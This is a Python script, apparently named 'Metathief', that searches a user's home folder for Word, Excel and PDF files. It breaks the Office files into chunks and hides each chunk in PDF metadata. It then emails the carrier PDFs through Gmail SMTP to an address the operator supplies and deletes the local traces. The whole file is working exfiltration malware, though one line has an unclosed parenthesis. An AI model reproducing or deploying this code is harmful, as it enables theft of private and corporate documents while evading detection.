""" Modulos que se necesitan """
import getpass
import os
import platform
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from PyPDF2 import PdfFileReader, PdfFileWriter



def _detect():
    """ Detectar SO donde esta """
    pathuser = []
    if platform.system() == "Linux":
        pathuser.append("Linux")
        pathuser.append("/home/" + getpass.getuser()
    elif platform.system() == "Windows":
        pathuser.append("Windows")
        pathuser.append("C:/Users/" + getpass.getuser())
    return pathuser


def _pack(fileExtract):
    """ Calculo de cantidad de paquetes en que se va dividir cada archvio a extraer """
    thieffile = os.path.getsize(fileExtract)
    cant = thieffile // 307200
    cant = cant + 1
    return cant


def _portadoras(pdfs):
    """ Genera lista de portadores """
    porta = []
    for pdf in pdfs:
        size = os.path.getsize(pdf)
        if size < 1024000:
            porta.append(pdf)
    if len(porta) != 0:
        return porta
    else:
        pdfcreate = open("Document.pdf", 'wb')
        creado = PdfFileWriter()
        creado.insertBlankPage(width=35, height=50, index=1)
        creado.write(pdfcreate)
        pathuser = _detect()
        if pathuser[0] == "Linux":
            porta.append(os.getcwd() + "/Document.pdf")
        if pathuser[0] == "Windows":
            porta.append(os.getcwd() + "\Document.pdf")
        pdfcreate.close()
        return porta


def _search(tipo):
    """ Permite buscar archivos, para Linux por la cabecera y en Windows con la extensión """
    pathuser = _detect()
    lista = []
    log = len(tipo)
    for ruta, direc, files in os.walk(pathuser[1], topdown=True):
        if pathuser[0] == "Linux":
            for det in files:
                vict = ruta + os.sep + det
                if os.access(vict, os.R_OK) and os.path.isfile(vict):
                    with open(vict, "rb") as f:
                        b = f.read(log)
                        if b == tipo:
                            lista.append(vict)
        elif pathuser[0] == "Windows":
            if tipo[0] == 80:
                ext = "xlsx"
                doc = "docx"
            else:
                ext = "pdf"
                doc = "pdf"
            for det in files:
                if det.endswith('.' + ext) or det.endswith('.' + doc):
                    vict = ruta + os.sep + det
                    with open(vict, "rb") as f:
                        b = f.read(log)
                        if b == tipo:
                            lista.append(vict)
    return lista


def _sender(exfilter, doc, tfiles):
    """ Envio por correo """
    fromaddr = """ Colocar correo valido para enviar"""
    passfrom = """ Colocar contraseña de la cuenta para enviar"""
    """ Colocar una cuenta valida para envio """
    toaddr = """ Colocar cuanta donde desea que llegue el archivo filtrado"""
    """ Colocar destino de los archivos filtrados """
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Metathief send file " + str(doc) + " of " + str(tfiles)
    body = "The system control were not effective, Metathief succeeds filtering your corporate secrets"
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(exfilter, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % exfilter)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, passfrom)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    attachment.close()
    s.quit()


def _writeMeta(cont, exfilt, cant, doc, carrier):
    """ Carga del paquete en el portador """
    with open(carrier, 'rb') as carrier_file:
        pdfFile = PdfFileReader(carrier_file)
        writer = PdfFileWriter()
        writer.appendPagesFromReader(pdfFile)
        metadata = pdfFile.getDocumentInfo()
        writer.addMetadata(metadata)
    """ Escribo la metadata: """
    writer.addMetadata({'/Comment': exfilt})
    """ Creo el archivo a enviar """
    usr = getpass.getuser()
    exfilter = str(doc) + "-th-" + str(usr) + "-ie-" + str(cant) + "-f-" + str(cont) + ".pdf"
    with open(exfilter, 'wb') as fout:
        writer.write(fout)
    return fout



def main():
    tipo = b'%PDF-1.7'
    pdfs = _search(tipo)
    carriers = _portadoras(pdfs)
    head = b'\x50\x4B\x03\x04\x14'
    files = _search(head)
    tfiles = len(files)
    usr = getpass.getuser()
    doc = 1
    ncarr = 0
    for fileExtract in files:
        cant = _pack(fileExtract)
        cont = 0
        while cont < cant:
            inic = 307200 * cont
            if cant != 1:
                with open(fileExtract, 'rb') as stolenfile:
                    stolenfile.seek(inic)
                    exfilt = stolenfile.read(307200)
            else:
                with open(fileExtract, 'rb') as stolenfile:
                    thieffile = os.path.getsize(fileExtract)
                    exfilt = stolenfile.read(thieffile)

            carrier = carriers[ncarr]
            _writeMeta(cont, exfilt, cant, doc, carrier)
            exfilter = str(doc) + "-th-" + str(usr) + "-ie-" + str(cant) + "-f-" + str(cont) + ".pdf"
            _sender(exfilter, doc, tfiles)
            os.remove(exfilter)
            cont = cont + 1
        if len(files) > doc and doc < len(carriers):
            doc = doc + 1
            ncarr = ncarr + 1
        else:
            doc = doc + 1
            ncarr = 0
    if os.path.isfile((os.getcwd() + "\Document.pdf")):
        os.remove(os.getcwd() + "\Document.pdf")


if __name__ == '__main__':
    main()
